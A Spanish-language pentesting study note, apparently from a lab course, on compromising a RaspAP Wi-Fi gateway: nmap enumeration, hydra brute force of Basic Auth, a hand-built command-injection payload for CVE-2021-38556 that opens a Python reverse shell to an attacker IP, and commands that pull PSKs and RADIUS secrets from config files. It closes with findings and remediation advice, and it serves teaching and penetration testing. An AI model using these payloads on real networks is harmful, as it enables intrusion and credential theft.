---
tags:
  - Wi-Fi/Enterprise
  - Pentesting/Explotacion
Descripción: "Tras entrar en la red, el propio AP o controlador es objetivo: enumeración del gateway, fuerza bruta de Basic Auth y por qué un exploit público que falla no cierra la vía"
Fecha de actualización: 2026-08-04
Nota previa: "[[08 - WPA2-Enterprise, evil twin y robo de credenciales]]"
Nota siguiente: "[[10 - Del Wi-Fi al dominio - la cadena]]"
Area: "[[Wi-Fi corporativo.base|Wi-Fi corporativo]]"
---
---

Recuperar la clave de una red no es el final: es el punto desde el que empieza el trabajo. <mark style="background: #ADCCFFA6;">El primer objetivo tras asociarse es siempre la puerta de enlace</mark>, porque un AP o controlador comprometido entrega la configuración de todas las redes que sirve — incluidas las PSK que no se lograron crackear y el secreto compartido del RADIUS.

# Situarse y enumerar

```shell-session
$ ip addr show wlan0
$ ip route
$ sudo nmap -sC -sV -p- --open 10.3.141.1
```

```text
80/tcp open  http    lighttpd 1.4.63
| http-auth:
|   HTTP/1.1 401 Unauthorized
|_  Basic realm=RaspAP
| http-cookie-flags:
|   /: PHPSESSID: httponly flag not set
```

Tres datos aprovechables en esa salida: el producto (`RaspAP`), el mecanismo de autenticación (**HTTP Basic**, no un formulario) y una cookie sin `httponly` que ya es un hallazgo menor por sí sola.

Identificar el producto es lo que decide todo lo demás. Un `lighttpd` genérico obliga a fuzzear; un `Basic realm=RaspAP` da nombre, y con el nombre llega la versión y con ella el CVE.

# Fuerza bruta contra Basic Auth

`hydra` con el módulo `http-get` ataca Basic Auth directamente. Espera pares `usuario:contraseña`, así que hay que anteponer el usuario a la wordlist:

```shell-session
$ sed 's/^/admin:/' /opt/wordlist.txt > combos.txt
$ hydra -C combos.txt -s 80 10.3.141.1 http-get /
```

| Argumento | Función |
| --------- | ------- |
| `-C fichero` | Fichero con `usuario:contraseña` por línea |
| `http-get /` | Módulo para Basic Auth (`http-head` también sirve) |
| `-s 80` | Puerto |

> [!warning]+ `sed -i` sobre la wordlist compartida
> El comando de HTB usa `sed -i -e 's/^/admin:/' /opt/wordlist.txt`, que **modifica el diccionario original en el sitio**. A partir de ahí, cualquier otro ataque que use ese fichero probará candidatas con el prefijo `admin:` pegado y fallará sin motivo aparente. <mark style="background: #FF5582A6;">Escribir a un fichero nuevo</mark> cuesta lo mismo y evita un fallo silencioso que puede costar horas.

Aquí conviene el mismo freno que en cualquier fuerza bruta autenticada: si el dispositivo tiene bloqueo por intentos, se pierde el acceso administrativo del cliente. En un controlador en producción eso es un incidente.

# Del panel al CVE

Con acceso, la página `About` da la versión. **RaspAP 2.6.6** corresponde a:

| Campo | Valor |
| ----- | ----- |
| CVE | `CVE-2021-38556` |
| Tipo | `CWE-77` — inyección de comandos |
| CVSS v3.1 | **8.8** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) |
| Componente | `includes/configure_client.php` |
| Requisito | Credenciales de bajo privilegio |

El `PR:L` del vector es lo que encadena los dos pasos: **primero la contraseña débil, después la ejecución de comandos**. Sin lo primero, el CVE no es explotable.

# Cuando el exploit público falla

El exploit de Exploit-DB para este CVE no funciona contra la instalación del escenario. <mark style="background: #FFB86CA6;">Que un exploit público falle **no descarta la vulnerabilidad**</mark>, y esa es la lección de método de esta sección: los scripts de terceros asumen rutas, versiones de PHP, formatos de sesión y payloads concretos que cambian entre despliegues.

La vía es reproducirlo a mano. Se intercepta la petición al endpoint vulnerable con Burp y se inyecta en el parámetro que acaba en la llamada al sistema:

```http
POST /wpa_conf HTTP/1.1
Host: 10.3.141.1
Content-Type: application/x-www-form-urlencoded

...&connect=wlan;%20python3+-c+'import+os,pty,socket%3bs%3dsocket.socket()%3bs.connect(("10.3.141.77",1337))%3b[os.dup2(s.fileno(),f)for+f+in(0,1,2)]%3bpty.spawn("/bin/bash")'
```

```shell-session
$ nc -lvnp 1337
Connection received on 10.3.141.1 33606
www-data@RaspAP:/var/www/html$
```

El `;` codificado como `%3b` es lo que corta el comando original; el resto es una *reverse shell* de Python con `pty` para tener una terminal interactiva. La mecánica de los separadores está en [[02 - Operadores de inyección de comandos]] y las evasiones en [[03 - Identificación de filtros y defensas]]; el catálogo de shells inversas, en [[03 - Reverse shells]] y su mejora a TTY en [[08 - Shells interactivas - upgrade a TTY]].

> [!important]+ La IP correcta importa
> La *reverse shell* debe apuntar a la dirección de la interfaz **inalámbrica** desde la que se llegó al gateway, no a la de gestión de la caja de ataque. Es el fallo más común al pivotar entre interfaces y produce un exploit que "no funciona" cuando en realidad la conexión de vuelta no tiene ruta.

# Qué se busca una vez dentro

```shell-session
$ cat /etc/hostapd/hostapd.conf          # PSK de cada WLAN
$ cat /etc/wpa_supplicant/wpa_supplicant.conf
$ grep -ri "shared_secret\|radius" /etc/  # secreto RADIUS
$ cat /etc/raspap/*.json
```

| Botín | Valor |
| ----- | ----- |
| `wpa_passphrase` de cada red | Las PSK que no cayeron por diccionario |
| Secreto compartido RADIUS | Permite suplantar al autenticador — ver [[08 - WPA2-Enterprise, evil twin y robo de credenciales]] |
| Credenciales de gestión | Reutilización contra el dominio |
| Tabla de clientes / DHCP | Inventario de dispositivos del cliente |

<mark style="background: #8000E1A6;">La configuración de un AP suele resolver de golpe lo que el crackeo no consiguió en días</mark>. Por eso el gateway se enumera **antes** de lanzar ataques de diccionario largos, no después.

En despliegues corporativos reales el objetivo equivalente no es un RaspAP sino un **WLC** (Cisco, Aruba, Ruckus, UniFi). Cambia la interfaz, no el razonamiento: la configuración exportada contiene las PSK de todas las WLAN, los secretos RADIUS y el mapa de VLAN. Su formato y cómo se craquean sus contraseñas están en [[09 - Contraseñas de dispositivos de red Cisco]].

# Hallazgos de esta fase

| Observación | Hallazgo |
| ----------- | -------- |
| Panel accesible desde la red de clientes | Falta segmentación de la gestión |
| Credenciales débiles en el AP | Acceso administrativo por fuerza bruta |
| Versión con CVE conocido | Falta de mantenimiento del firmware |
| Cookie sin `httponly` | Robo de sesión por XSS |
| PSK en claro en la configuración | Compromiso del AP = compromiso de todas sus redes |

La recomendación transversal es la más barata: <mark style="background: #FFB8EBA6;">la interfaz de gestión de la infraestructura inalámbrica no debe ser alcanzable desde la red de clientes</mark>, ni de invitados ni corporativa. Es una ACL, no un proyecto.
